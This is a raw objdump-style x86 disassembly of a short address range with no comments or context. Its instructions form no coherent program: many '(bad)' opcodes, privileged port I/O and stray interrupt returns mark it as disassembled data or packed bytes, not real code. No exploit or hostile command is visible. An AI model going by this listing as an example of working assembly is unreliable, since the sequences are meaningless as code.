  48f0a5:	jo     0x48f0fc
  48f0a7:	or     eax,0x8243c709
  48f0ac:	adc    dl,BYTE PTR [edx+esi*4-0x61]
  48f0b0:	mov    edx,0x8385bd0d
  48f0b5:	xlat   BYTE PTR ds:[ebx]
  48f0b6:	mov    edi,0xc6952b75
  48f0bb:	jg     0x48f10c
  48f0bd:	(bad)  
  48f0be:	lds    esp,FWORD PTR [esi-0x50c4f85d]
  48f0c4:	or     al,0x63
  48f0c6:	push   ecx
  48f0c7:	loop   0x48f068
  48f0c9:	pop    edi
  48f0ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f0cb:	mov    ds:0xe7c7f102,al
  48f0d0:	add    DWORD PTR [eax-0x5d],ebp
  48f0d3:	dec    esp
  48f0d4:	scas   eax,DWORD PTR es:[edi]
  48f0d5:	or     BYTE PTR [edx-0x3b],ah
  48f0d8:	push   ebp
  48f0d9:	push   DWORD PTR [esi]
  48f0db:	ret    
  48f0dc:	adc    dl,BYTE PTR ds:0xa76faade
  48f0e2:	ja     0x48f088
  48f0e4:	inc    ebx
  48f0e5:	ret    0xbf8a
  48f0e8:	scas   eax,DWORD PTR es:[edi]
  48f0e9:	inc    ebp
  48f0ea:	ret    
  48f0eb:	scas   al,BYTE PTR es:[edi]
  48f0ec:	push   eax
  48f0ed:	outs   dx,DWORD PTR ds:[esi]
  48f0ee:	ja     0x48f137
  48f0f0:	xor    al,0x56
  48f0f2:	ret    0x42c2
  48f0f5:	fld    TBYTE PTR [edx+0xf5d4d04]
  48f0fb:	aaa    
  48f0fc:	repz imul eax,DWORD PTR [esi],0x42
  48f100:	push   ebp
  48f101:	pop    edi
  48f102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f103:	sub    dl,bl
  48f105:	or     al,0x13
  48f107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f108:	ja     0x48f0c2
  48f10a:	push   ebp
  48f10b:	or     eax,0x7732cf57
  48f110:	push   es
  48f111:	pusha  
  48f112:	(bad)  
  48f113:	and    al,BYTE PTR [ebp+0x47]
  48f116:	out    0x3f,al
  48f118:	sbb    ch,BYTE PTR ds:0xef979118
  48f11e:	xor    esp,DWORD PTR [ebx+0x5f0b05a2]
  48f124:	pop    es
  48f125:	(bad)  
  48f126:	mov    bx,0xbb0
  48f12a:	dec    DWORD PTR [edi-0x41]
  48f12d:	xor    ebp,DWORD PTR [esi]
  48f12f:	jns    0x48f197
  48f131:	dec    ebx
  48f132:	das    
  48f133:	inc    esp
  48f134:	cmp    BYTE PTR [ebp-0x33],al
  48f137:	pop    edx
  48f138:	mov    esi,0x337fd777
  48f13d:	dec    edi
  48f13e:	inc    eax
  48f13f:	mov    ah,0x88
  48f141:	mov    al,ds:0x235a774f
  48f146:	mov    BYTE PTR [edi],dh
  48f148:	cmp    DWORD PTR [edi],eax
  48f14a:	inc    DWORD PTR [ecx+0x2d]
  48f14d:	cdq    
  48f14e:	mov    al,ds:0x47843477
  48f153:	pusha  
  48f154:	inc    ecx
  48f155:	pop    ds
  48f156:	outs   dx,DWORD PTR ds:[esi]
  48f157:	xor    eax,0x3f38d768
  48f15c:	pop    edi
  48f15d:	iret   
  48f15e:	rol    DWORD PTR [edx+0x41a7a283],1
  48f164:	pop    ds
  48f165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f166:	test   al,0xe
  48f168:	stos   BYTE PTR es:[edi],al
  48f169:	push   esi
  48f16a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f16b:	xor    DWORD PTR [edi-0x7b],esi
  48f16e:	xor    DWORD PTR [ecx],eax
  48f170:	or     esp,DWORD PTR [edi+0x16]
  48f173:	inc    esp
  48f174:	inc    edi
  48f175:	xor    eax,DWORD PTR [edi]
  48f177:	cmp    edi,ecx
  48f179:	and    bl,BYTE PTR ss:[edx]
  48f17c:	jecxz  0x48f1d0
  48f17e:	ss iret 
  48f180:	(bad)  
  48f181:	push   eax
  48f182:	sub    eax,0xa747b404
  48f187:	jo     0x48f18b
  48f189:	pop    edx
  48f18a:	jb     0x48f1c0
  48f18c:	aaa    
  48f18d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f18e:	shr    DWORD PTR [esi-0x50b83093],1
  48f194:	xor    al,0x81
  48f196:	sbb    al,0xd1
  48f198:	mov    dh,0xc7
  48f19a:	(bad)  
  48f19b:	cmp    BYTE PTR [eax+ebp*4+0x3a],ah
  48f19f:	arpl   WORD PTR [esi],dx
  48f1a1:	mov    bh,0x38
  48f1a3:	mov    dh,0x62
  48f1a5:	xchg   esp,eax
  48f1a6:	mov    ah,0x97
  48f1a8:	out    dx,eax
  48f1a9:	cmp    al,0x47
  48f1ab:	mov    ah,0x16
  48f1ad:	xlat   BYTE PTR ds:[ebx]
  48f1ae:	(bad)  
  48f1af:	cmp    DWORD PTR [edi],esi
  48f1b1:	nop
  48f1b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f1b3:	adc    DWORD PTR [ebp-0x72c6d1a1],0x11
  48f1ba:	shr    DWORD PTR ds:0x34182f3a,cl
  48f1c0:	and    BYTE PTR [edx],al
  48f1c2:	out    dx,eax
  48f1c3:	pop    es
  48f1c4:	sub    DWORD PTR [ecx],edi
  48f1c6:	xchg   edx,eax
  48f1c7:	aad    0x43
  48f1c9:	jbe    0x48f1fd
  48f1cb:	mov    dh,0x8e
  48f1cd:	test   DWORD PTR [edi+esi*4+0x37],esi
  48f1d1:	(bad)  
  48f1d2:	iret   
  48f1d3:	cmp    bl,BYTE PTR [edx]
  48f1d5:	push   ss
  48f1d6:	and    edi,DWORD PTR [edx-0x31]
  48f1d9:	xor    dl,BYTE PTR [eax-0x1853cb52]
  48f1df:	movzx  edx,WORD PTR [ebp+0x30]
  48f1e3:	aad    0x21
  48f1e5:	sbb    edi,edi
  48f1e7:	inc    DWORD PTR ss:[edi]
  48f1ea:	enter  0xc817,0x36
  48f1ee:	xor    al,BYTE PTR [eax]
  48f1f0:	xor    DWORD PTR [edx+0x5d],eax
  48f1f3:	gs (bad) 
  48f1f5:	and    eax,0x9befc738
  48f1fa:	scas   al,BYTE PTR es:[edi]
  48f1fb:	les    ebp,FWORD PTR ds:0x5b32171f
  48f201:	add    BYTE PTR [ebp+ebp*2-0x3ed0e829],al
  48f208:	sub    BYTE PTR ds:0x365737ab,al
  48f20e:	ja     0x48f216
  48f210:	cmp    esp,DWORD PTR [ecx+edx*1-0x44a505e1]
  48f217:	or     ch,BYTE PTR [ebx]
  48f219:	movsx  eax,WORD PTR [esi-0x39]
  48f21d:	add    BYTE PTR [eax+ecx*2+0x62e72357],ch
  48f224:	xchg   esp,eax
  48f225:	sbb    BYTE PTR [edi],dh
  48f227:	jae    0x48f240
  48f229:	aad    0x23
  48f22b:	mov    al,0x2e
  48f22d:	pop    ds
  48f22e:	xchg   edi,eax
  48f22f:	jmp    FWORD PTR [ebp+0x68]
  48f232:	leave  
  48f233:	add    al,0x34
  48f235:	imul   esi,DWORD PTR [ecx+0x50],0x8b57cfd8
  48f23c:	sbb    edx,eax
  48f23e:	cs ja  0x48f2a0
  48f241:	mov    BYTE PTR [ebp+0x61],dl
  48f244:	push   ebp
  48f245:	aaa    
  48f246:	scas   eax,DWORD PTR es:[edi]
  48f247:	push   0x379a4205
  48f24c:	ja     0x48f250
  48f24e:	sub    al,0xe
  48f250:	pop    esp
  48f251:	mov    ecx,DWORD PTR [edi+0x601b11b7]
  48f257:	test   DWORD PTR [ebx+0x75c25b89],ebp
  48f25d:	xlat   BYTE PTR ds:[ebx]
  48f25e:	inc    ebx
  48f25f:	jg     0x48f21b
  48f261:	push   esi
  48f262:	mov    ah,0x4a
  48f264:	das    
  48f265:	daa    
  48f266:	pop    es
  48f267:	and    BYTE PTR [eax],bh
  48f269:	in     al,0x39
  48f26b:	xor    al,0x41
  48f26d:	xor    edi,DWORD PTR [edi]
  48f26f:	push   0x7fd08561
  48f274:	in     al,0x26
  48f276:	sub    al,0xaa
  48f278:	dec    edi
  48f279:	cmovae esp,DWORD PTR [edx-0x7c]
  48f27d:	and    dl,BYTE PTR [ecx+0x709085f3]
  48f283:	xor    BYTE PTR [edi+0x5b6c1732],cl
  48f289:	mov    ah,0x61
  48f28b:	call   DWORD PTR [ebx+0x6b035f17]
  48f291:	xor    dh,BYTE PTR [esi+0x6804ef17]
  48f297:	aad    0x5
  48f299:	pop    ss
  48f29a:	adc    al,0xa5
  48f29c:	and    eax,edx
  48f29e:	pop    ds
  48f29f:	movsx  esp,WORD PTR [ecx]
  48f2a2:	arpl   WORD PTR [ebp-0x37],bp
  48f2a5:	cmp    BYTE PTR [edi],ch
  48f2a7:	adc    eax,0x67584f00
  48f2ac:	mov    bh,0xdf
  48f2ae:	je     0x48f29f
  48f2b0:	shr    DWORD PTR [eax],0xff
  48f2b3:	pop    edi
  48f2b4:	test   DWORD PTR [edx-0x7b],0x673312b0
  48f2bb:	mov    bh,0x8d
  48f2bd:	and    bl,BYTE PTR [edx]
  48f2bf:	pop    eax
  48f2c0:	(bad)  
  48f2c1:	xchg   edx,eax
  48f2c2:	test   BYTE PTR [ebx],ch
  48f2c4:	lods   eax,DWORD PTR ds:[esi]
  48f2c5:	add    esp,DWORD PTR [ebx-0x1de67f70]
  48f2cb:	pop    es
  48f2cc:	xor    al,0xc8
  48f2ce:	push   ebp
  48f2cf:	pop    ebp
  48f2d0:	xor    eax,0x38bf43c7
  48f2d5:	mov    ds:0xe7161040,eax
  48f2da:	je     0x48f30c
  48f2dc:	cs dec eax
  48f2de:	xchg   ebx,eax
  48f2df:	pop    edi
  48f2e0:	add    BYTE PTR [edx],cl
  48f2e2:	imul   esi,DWORD PTR [eax-0x7bfe8df1],0xffffffd4
  48f2e9:	xchg   edi,eax
  48f2ea:	inc    edi
  48f2eb:	xor    esp,DWORD PTR ds:0x574a0562
  48f2f1:	les    ebx,FWORD PTR [edx]
  48f2f3:	test   ebp,eax
  48f2f5:	nop    DWORD PTR [ebx+0x50]
  48f2f9:	xchg   ebx,eax
  48f2fa:	jp     0x48f327
  48f2fc:	daa    
  48f2fd:	xchg   BYTE PTR ss:0xf37ff98,bl
  48f304:	mov    bh,0xa7
  48f306:	cdq    
  48f307:	shr    ch,cl
  48f309:	ficom  WORD PTR [edi]
  48f30b:	cmp    al,BYTE PTR [edi+0x30]
  48f30e:	add    al,0x40
  48f310:	nop
  48f311:	sub    edi,0xa8ae3f32
  48f317:	aad    0x16
  48f319:	outs   dx,DWORD PTR ds:[esi]
  48f31a:	outs   dx,DWORD PTR ds:[esi]
  48f31b:	mov    eax,ds:0x37aae48d
  48f320:	xor    al,0x67
  48f322:	nop
  48f323:	mov    ds:0xf675d82,eax
  48f328:	inc    ebp
  48f329:	test   eax,0xd72d0237
  48f32e:	das    
  48f32f:	sbb    BYTE PTR [ebp+0x1f57d8eb],al
  48f335:	inc    ebp
  48f336:	xlat   BYTE PTR ds:[ebx]
  48f337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48f338:	add    edx,esi
  48f33a:	adc    bh,al
  48f33c:	adc    ah,BYTE PTR [edx+0x22]
  48f33f:	push   esi
  48f340:	xchg   DWORD PTR [edi],edx
  48f342:	pop    ss
  48f343:	add    DWORD PTR [ecx],0x35
  48f346:	adc    edi,edx
  48f348:	inc    esi
  48f349:	ror    DWORD PTR [esi+0x1c],cl
  48f34c:	dec    esp
  48f34d:	out    dx,eax
  48f34e:	xor    al,0xe7
  48f350:	das    
  48f351:	xchg   ecx,eax
  48f352:	xchg   BYTE PTR [ebp+0x269be75a],dl
  48f358:	inc    ecx
  48f359:	arpl   WORD PTR [eax],si
  48f35b:	xchg   edi,eax
  48f35c:	out    dx,eax
  48f35d:	shr    BYTE PTR [edx+0x580f30a0],cl
  48f363:	mov    eax,0xbfef2c2e
  48f368:	sbb    BYTE PTR ss:[eax],ch
  48f36b:	and    al,0x2e
  48f36d:	(bad)  
  48f36e:	aaa    
  48f36f:	lea    eax,[ecx]
  48f371:	mov    bl,0x31
  48f373:	pop    ss
  48f374:	sbb    dh,BYTE PTR [ebp-0x4b]
  48f377:	test   al,0x5f
  48f379:	out    dx,eax
  48f37a:	call   edx
  48f37c:	inc    esp
  48f37d:	pusha  
  48f37e:	push   edi
  48f37f:	dec    edi
  48f380:	out    0x74,eax
  48f382:	and    BYTE PTR ds:0x3846a7a0,bl
  48f388:	push   ss
  48f389:	add    al,0x93
  48f38b:	mov    WORD PTR [ecx],?
  48f38d:	inc    esp
  48f38e:	outs   dx,DWORD PTR ds:[esi]
  48f38f:	push   esi
  48f390:	add    al,0x2c
  48f392:	jmp    0x36a82d36
  48f397:	mov    cl,0x8a
  48f399:	xchg   edi,eax
  48f39a:	loop   0x48f3bb
  48f39c:	inc    eax
  48f39d:	inc    esi
  48f39e:	and    DWORD PTR [ecx+0x6daf3746],ebp
  48f3a4:	add    eax,0x421f35db
  48f3a9:	inc    edi
  48f3aa:	iret   
  48f3ab:	arpl   WORD PTR [eax+0x47b4b0c9],sp
  48f3b1:	addr16 inc esi
  48f3b3:	and    esi,DWORD PTR [edx+edx*2+0x77279758]
  48f3ba:	dec    ecx
  48f3bb:	sbb    BYTE PTR [ebp+0x162a0f58],dl
  48f3c1:	push   cs
  48f3c2:	push   0xffffffc7
  48f3c4:	cmp    DWORD PTR [edi+0x51],edx
  48f3c7:	pop    ecx
  48f3c8:	pop    edx
  48f3c9:	ins    DWORD PTR es:[edi],dx
  48f3ca:	xor    BYTE PTR [edi+0x3f],ch
  48f3cd:	rol    DWORD PTR [edi+eax*2-0x408c9043],cl
  48f3d4:	inc    esp
  48f3d5:	xchg   edx,eax
  48f3d6:	push   cs
  48f3d7:	mov    ch,BYTE PTR [ebx-0x71]
  48f3da:	inc    ecx
  48f3db:	pop    ss
  48f3dc:	xor    al,0x3e
  48f3de:	loopne 0x48f3f0
  48f3e0:	jmp    0x32687b30
  48f3e5:	add    al,0x6e
  48f3e7:	mov    cl,0xe
  48f3e9:	scas   eax,DWORD PTR es:[edi]
  48f3ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f3eb:	sub    bl,BYTE PTR [eax]
  48f3ed:	push   ds
  48f3ee:	jne    0x48f459
  48f3f0:	(bad)  
  48f3f1:	ss mov bh,0xd7
  48f3f4:	rol    BYTE PTR [edx+ebx*8+0x3b],0x44
  48f3f9:	jmp    0x48f42a
  48f3fb:	pop    ecx
  48f3fc:	cmp    dh,BYTE PTR [ebx+0x351fa731]
  48f402:	nop
  48f403:	pop    ss
  48f404:	dec    ebx
  48f405:	outs   dx,DWORD PTR ds:[esi]
  48f407:	inc    esp
  48f408:	pop    edi
  48f409:	cmp    DWORD PTR [edx-0x8215a91],eax
  48f40f:	lahf   
  48f410:	add    esi,DWORD PTR [edi+eiz*1]
  48f413:	xchg   ebp,eax
  48f414:	or     bh,BYTE PTR [esi]
  48f416:	mov    al,0xb
  48f418:	daa    
  48f419:	mov    ch,0x81
  48f41b:	add    eax,0x5f97afab
  48f420:	sbb    al,0x56
  48f422:	mov    WORD PTR [edx+0x4e],es
  48f425:	outs   dx,DWORD PTR ds:[esi]
  48f426:	mov    dl,0x28
  48f428:	push   esi
  48f429:	xchg   edi,eax
  48f42a:	and    al,0x7
  48f42c:	ja     0x48f3af
  48f42e:	sub    ch,BYTE PTR [eax-0x50]
  48f431:	push   ds
  48f432:	ja     0x48f475
  48f434:	pop    ebp
  48f435:	push   0x55
  48f437:	pop    ss
  48f438:	scas   eax,DWORD PTR es:[edi]
  48f439:	xchg   ecx,eax
  48f43a:	rcr    BYTE PTR [edx],0xf0
  48f43d:	pop    ds
  48f43e:	pavgw  mm2,mm2
  48f441:	lods   eax,DWORD PTR ds:[esi]
  48f442:	mov    eax,ds:0x52a7329f
  48f447:	jmp    0x8fde:0x6f2050bb
  48f44e:	xor    eax,0x54a09839
  48f453:	pop    ds
  48f454:	push   DWORD PTR [ebx]
  48f456:	push   esi
  48f457:	mov    ah,0x2
  48f459:	inc    eax
  48f45a:	dec    edi
  48f45b:	iret   
  48f45c:	sub    BYTE PTR [eax+edx*2],ch
  48f45f:	hlt    
  48f460:	pop    ds
  48f461:	ja     0x48f4aa
  48f463:	and    eax,0x77ab12a4
  48f468:	xchg   edi,eax
  48f469:	xchg   esi,eax
  48f46a:	outs   dx,BYTE PTR ds:[esi]
  48f46b:	sub    eax,0x3f9a97c6
  48f470:	pop    es
  48f471:	adc    eax,0x8f4761b0
  48f476:	jg     0x48f463
  48f478:	mov    esi,0x3fc22c01
  48f47d:	pop    edi
  48f47e:	sbb    BYTE PTR [eax-0x2d],bl
  48f481:	sub    dh,BYTE PTR [edi]
  48f483:	pop    es
  48f484:	les    eax,FWORD PTR [ecx-0x15]
  48f487:	mov    al,0x1f
  48f489:	push   ds
  48f48a:	jg     0x48f4ac
  48f48c:	(bad)  
  48f48d:	nop
  48f48e:	mov    cl,BYTE PTR [edi+0xf]
  48f491:	ret    
  48f492:	lea    ebx,[edx-0x57]
  48f495:	ja     0x48f4de
  48f497:	out    0xd7,al
  48f499:	popa   
  48f49a:	mov    bh,0xa4
  48f49c:	adc    DWORD PTR [edi+0x1d],eax
  48f49f:	outs   dx,DWORD PTR ds:[esi]
  48f4a0:	or     eax,0x37d7e7a1
  48f4a5:	xlat   BYTE PTR ds:[ebx]
  48f4a6:	xchg   dl,dl
  48f4a8:	mov    cl,0x61
  48f4aa:	(bad)  
  48f4ab:	xlat   BYTE PTR ds:[ebx]
  48f4ac:	repnz add al,0x69
  48f4af:	adc    eax,0x8d43ee67
  48f4b4:	test   BYTE PTR [edx],ah
  48f4b6:	adc    esi,DWORD PTR [edx]
  48f4b8:	out    0x38,eax
  48f4ba:	lods   al,BYTE PTR ds:[esi]
  48f4bb:	rcr    BYTE PTR [edx+0x6f],0x3
  48f4bf:	dec    esi
  48f4c0:	loop   0x48f518
  48f4c2:	sub    eax,0x730f96a7
  48f4c7:	or     edi,DWORD PTR [ecx-0x4f]
  48f4ca:	cmovb  esp,DWORD PTR [ebx+0xdb0a3ca]
  48f4d1:	mov    ds,WORD PTR [edi]
  48f4d3:	dec    edi
  48f4d4:	outs   dx,DWORD PTR ds:[esi]
  48f4d5:	test   DWORD PTR [eax],eax
  48f4d7:	mov    ds:0x204fab50,eax
  48f4dc:	push   ebp
  48f4dd:	sbb    ch,BYTE PTR [edi-0x51]
  48f4e0:	xlat   BYTE PTR ds:[ebx]
  48f4e1:	(bad)  
  48f4e3:	cmp    ah,BYTE PTR [edi+edx*2+0xb]
  48f4e7:	mov    ebx,0xd2845834
  48f4ec:	push   0x86d6efa7
  48f4f1:	mov    ds:0x173517c0,eax
  48f4f6:	adc    al,BYTE PTR [edx+0xc]
  48f4f9:	mov    ds:0x4cd50f0f,eax
  48f4fe:	loope  0x48f52d
  48f500:	sti    
  48f501:	addr16 ja 0x48f506
  48f504:	outs   dx,DWORD PTR ds:[esi]
  48f505:	mov    DWORD PTR [edx-0x64e0e819],0x873e4252
  48f50f:	xor    eax,0xadad0056
  48f514:	lahf   
  48f515:	ffreep st(7)
  48f517:	cmp    BYTE PTR [edx-0x16],dl
  48f51a:	push   ss
  48f51b:	mov    edi,0xb40c48e7
  48f520:	xor    BYTE PTR [esi-0x54841a79],dh
  48f526:	xchg   ecx,eax
  48f527:	fistp  WORD PTR [edi-0x79]
  48f52a:	xor    al,0x22
  48f52c:	mov    ch,0x85
  48f52e:	xchg   BYTE PTR [edi],cl
  48f530:	iret   
  48f531:	ins    DWORD PTR es:[edi],dx
  48f532:	xor    eax,0x17dfeb42
  48f537:	pop    ds
  48f538:	int    0xc6
  48f53a:	stos   BYTE PTR es:[edi],al
  48f53b:	pusha  
  48f53c:	addr16 mov ds:0xb6a2,eax
  48f540:	add    ch,BYTE PTR ds:0x1a510f97
  48f546:	(bad)  
  48f547:	rcr    BYTE PTR [ebx],cl
  48f549:	xlat   BYTE PTR ds:[ebx]
  48f54a:	arpl   WORD PTR [edx],bx
  48f54c:	and    DWORD PTR [esp+esi*1],ebx
  48f54f:	das    
  48f550:	inc    ebx
  48f551:	pop    es
  48f552:	mov    esp,edx
  48f554:	add    al,0xef
  48f556:	xlat   BYTE PTR ds:[ebx]
  48f557:	or     ch,BYTE PTR [ecx-0x50c9e8a7]
  48f55d:	aam    0x76
  48f55f:	pusha  
  48f560:	adc    DWORD PTR [edi+0x60464f5f],ebp
  48f566:	jno    0x48f593
  48f568:	ja     0x48f501
  48f56a:	aam    0xaa
  48f56c:	xor    BYTE PTR [eax+0x41563467],0x2b
  48f573:	pop    ds
  48f574:	lahf   
  48f575:	push   ss
  48f576:	and    al,0x69
  48f578:	outs   dx,BYTE PTR ds:[esi]
  48f579:	xchg   DWORD PTR [ecx],esi
  48f57b:	inc    esp
  48f57c:	pop    es
  48f57d:	sbb    BYTE PTR [edx+0x374fc07c],al
  48f583:	add    BYTE PTR [edi],dh
  48f585:	dec    edi
  48f586:	(bad)  
  48f587:	and    ah,ah
  48f589:	cmp    DWORD PTR [ecx],0x0
  48f58c:	cmp    DWORD PTR [edi],ebx
  48f58e:	int    0x32
  48f590:	(bad)  
  48f591:	add    bh,bh
  48f593:	aas    
  48f594:	(bad)  
  48f595:	(bad)  
  48f596:	sub    al,0x2a
  48f598:	aas    
  48f599:	aas    
  48f59a:	push   0x58
  48f59c:	xchg   ebp,eax
  48f59d:	hlt    
  48f59e:	mov    ds:0x9ad04fcf,eax
  48f5a3:	push   ss
  48f5a4:	add    al,0x7
  48f5a6:	iret   
  48f5a7:	push   ecx
  48f5a8:	adc    BYTE PTR [eax],bl
  48f5aa:	inc    esp
  48f5ab:	daa    
  48f5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48f5ad:	sub    dh,0x8
  48f5b0:	retf   0xfb46
  48f5b3:	jp     0x48f5f0
  48f5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f5b6:	xchg   edi,eax
  48f5b7:	sub    BYTE PTR [edi],bh
  48f5b9:	pop    edi
  48f5ba:	pop    ss
  48f5bb:	and    ebp,eax
  48f5bd:	dec    esp
  48f5be:	or     ah,BYTE PTR [edi+0x6041a498]
  48f5c4:	xchg   DWORD PTR [edi],edx
  48f5c6:	push   0x5b
  48f5c8:	daa    
  48f5c9:	xor    DWORD PTR [edi+0x1f],ecx
  48f5cc:	jnp    0x48f57e
  48f5ce:	mov    al,0x26
  48f5d0:	pop    ss
  48f5d1:	xchg   edi,esp
  48f5d3:	push   ss
  48f5d4:	push   esi
  48f5d5:	enter  0x2316,0xce
  48f5d9:	cwde   
  48f5da:	mov    ah,0x61
  48f5dc:	or     eax,0x957f17f7
  48f5e1:	aam    0x90
  48f5e3:	xchg   esi,eax
  48f5e4:	jle    0x48f616
  48f5e6:	ja     0x48f594
  48f5e8:	or     DWORD PTR [ecx+0x352f0f60],esp
  48f5ee:	adc    eax,0x342726b9
  48f5f3:	(bad)  
  48f5f5:	gs loopne 0x48f663
  48f5f8:	and    eax,edi
  48f5fa:	add    DWORD PTR [ebx+0x2f2fb4a1],ecx
  48f600:	popa   
  48f601:	and    al,0x79
  48f603:	aam    0xe
  48f605:	jbe    0x48f639
  48f607:	sbb    edx,DWORD PTR [ecx]
  48f609:	push   es
  48f60a:	daa    
  48f60b:	aaa    
  48f60c:	(bad)  
  48f60d:	inc    esp
  48f60f:	pop    ss
  48f610:	xor    DWORD PTR [ebx+eax*2],eax
  48f613:	das    
  48f614:	leave  
  48f615:	mov    ch,0xc5
  48f617:	cmp    bl,BYTE PTR [edi]
  48f619:	pop    ss
  48f61a:	aas    
  48f61b:	inc    ebp
  48f61c:	dec    edx
  48f61d:	popa   
  48f61e:	adc    eax,0x70f345c
  48f623:	fadd   DWORD PTR [edx+0x35]
  48f626:	mov    es,WORD PTR [edi+eiz*2-0x1]
  48f62a:	push   ecx
  48f62b:	add    al,BYTE PTR [edi-0x6]
  48f62e:	pop    ds
  48f62f:	out    0xcf,eax
  48f631:	popa   
  48f632:	adc    eax,0xefef80d6
  48f637:	add    BYTE PTR [ecx+0x6f1ed6c0],ah
  48f63d:	adc    edx,DWORD PTR [ebx-0x29]
  48f640:	add    BYTE PTR [edi+0x46],dl
  48f643:	xchg   DWORD PTR [eax],esi
  48f645:	mov    dh,0x6a
  48f647:	and    esp,DWORD PTR [ecx]
  48f649:	(bad)  
  48f64a:	test   DWORD PTR [ebp+0x36864b74],0x621036ff
  48f654:	xor    BYTE PTR [eax+0x42],dh
  48f657:	pop    es
  48f658:	loopne 0x48f5da
  48f65a:	loopne 0x48f6ae
  48f65c:	pop    es
  48f65d:	adc    al,BYTE PTR [edi]
  48f65f:	xor    BYTE PTR [ebp+0x3bb4d6d8],al
  48f665:	daa    
  48f666:	mov    edi,0xe141d21f
  48f66b:	arpl   di,dx
  48f66d:	pop    edi
  48f66e:	je     0x48f6dd
  48f670:	ss sahf 
  48f672:	aaa    
  48f673:	pop    edi
  48f674:	push   edi
  48f675:	or     bl,BYTE PTR [esp+esi*4]
  48f678:	jo     0x48f6bd
  48f67a:	ja     0x48f692
  48f67c:	add    al,0xb9
  48f67e:	add    edi,ebx
  48f680:	xor    eax,0xeb010a87
  48f685:	add    dh,BYTE PTR [edi-0x9]
  48f688:	and    eax,0xa9703ac
  48f68d:	scas   eax,DWORD PTR es:[edi]
  48f68e:	sub    al,0xa5
  48f690:	retf   
  48f691:	pop    eax
  48f692:	jg     0x48f683
  48f694:	js     0x48f6d8
  48f696:	xchg   edx,eax
  48f697:	sbb    ebp,edi
  48f699:	xor    bh,al
  48f69b:	jecxz  0x48f6b7
  48f69d:	mov    edx,eax
  48f69f:	outs   dx,DWORD PTR ds:[esi]
  48f6a0:	inc    ebx
  48f6a1:	and    dh,dl
  48f6a3:	lea    esi,ds:0x58c91faf
  48f6a9:	pop    ebx
  48f6aa:	or     eax,0x14aab707
  48f6af:	mov    cl,0x26
  48f6b1:	test   DWORD PTR [edi+0x4112a5c2],0x8cc4d717
  48f6bb:	push   ebp
  48f6bc:	shl    DWORD PTR [edi+0x1f],cl
  48f6bf:	(bad)  
  48f6c0:	and    bh,BYTE PTR [ebp+0x68]
  48f6c3:	mul    DWORD PTR [edi]
  48f6c5:	or     al,0x66
  48f6c7:	popa   
  48f6c8:	push   ebp
  48f6c9:	out    0x6f,eax
  48f6cb:	test   al,0xd6
  48f6cd:	push   cs
  48f6ce:	push   esi
  48f6cf:	scas   eax,DWORD PTR es:[edi]
  48f6d0:	jnp    0x48f701
  48f6d2:	iret   
  48f6d3:	lea    ebx,[ecx+0x2f32ed18]
  48f6d9:	scas   eax,DWORD PTR es:[edi]
  48f6da:	push   edx
  48f6db:	sub    DWORD PTR [eax+0x65],ebx
  48f6de:	xchg   edi,eax
  48f6df:	pop    ss
  48f6e0:	add    al,0xb4
  48f6e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f6e3:	lea    ebp,[edi+0x66]
  48f6e6:	xor    ebp,DWORD PTR [ebp+0x70]
  48f6e9:	fsubr  st(0),st
  48f6eb:	aaa    
  48f6ec:	pop    esi
  48f6ed:	dec    edi
  48f6ee:	dec    edi
  48f6ef:	add    ch,al
  48f6f1:	nop
  48f6f2:	outs   dx,DWORD PTR ds:[esi]
  48f6f3:	pop    es
  48f6f4:	xor    dh,BYTE PTR [ebx]
  48f6f6:	xchg   DWORD PTR [edi],eax
  48f6f8:	stos   DWORD PTR es:[edi],eax
  48f6f9:	inc    ebp
  48f6fa:	push   es
  48f6fb:	inc    edx
  48f6fc:	aas    
  48f6fd:	(bad)  
  48f6ff:	mov    WORD PTR [ebp-0x30d0548e],es
  48f705:	pop    eax
  48f706:	test   DWORD PTR [esi],eax
  48f708:	loop   0x48f748
  48f70a:	aas    
  48f70b:	push   cx
  48f70d:	sbb    DWORD PTR [ecx-0x660c2826],ecx
  48f713:	mov    ebp,0x4357812b
  48f718:	out    0x1f,eax
  48f71a:	inc    ecx
  48f71b:	pusha  
  48f71c:	pop    esp
  48f71d:	add    BYTE PTR [eax],dh
  48f71f:	xchg   edi,eax
  48f720:	xor    DWORD PTR [eax],ebx
  48f722:	push   edi
  48f723:	shl    DWORD PTR [edx],cl
  48f725:	push   edi
  48f726:	inc    ecx
  48f727:	xlat   BYTE PTR ds:[ebx]
  48f728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48f729:	xchg   ecx,eax
  48f72a:	cmp    dh,BYTE PTR [ecx]
  48f72c:	inc    ecx
  48f72d:	dec    edi
  48f72e:	xchg   ebp,eax
  48f72f:	rcr    dl,0x20
  48f732:	inc    edi
  48f733:	jg     0x48f7ab
  48f735:	inc    ecx
  48f736:	ror    BYTE PTR [edx+0x21],0x25
  48f73a:	xchg   edi,eax
  48f73b:	test   BYTE PTR [bx+di],0xec
  48f73f:	pop    es
  48f740:	(bad)  
  48f741:	daa    
  48f742:	inc    ebx
  48f743:	mov    al,0xd2
  48f745:	pop    edx
  48f746:	add    eax,0xc44a4b0f
  48f74b:	ret    0x4f27
  48f74e:	das    
  48f74f:	or     DWORD PTR [ebx+0x177274a4],ebp
  48f755:	aam    0x86
  48f757:	aad    0x48
  48f759:	mul    DWORD PTR [ebx-0x2b]
  48f75c:	fidiv  DWORD PTR [ecx]
  48f75e:	jp     0x48f71f
  48f760:	out    dx,al
  48f761:	inc    edi
  48f762:	jmp    DWORD PTR [ebx+0x31c440b1]
  48f768:	inc    edi
  48f769:	not    ecx
  48f76b:	or     eax,0x67344303
  48f770:	push   ss
  48f771:	or     DWORD PTR ds:0xad682727,0xff6fa846
  48f77b:	arpl   bp,cx
  48f77d:	and    al,0x56
  48f77f:	iret   
  48f780:	dec    edi
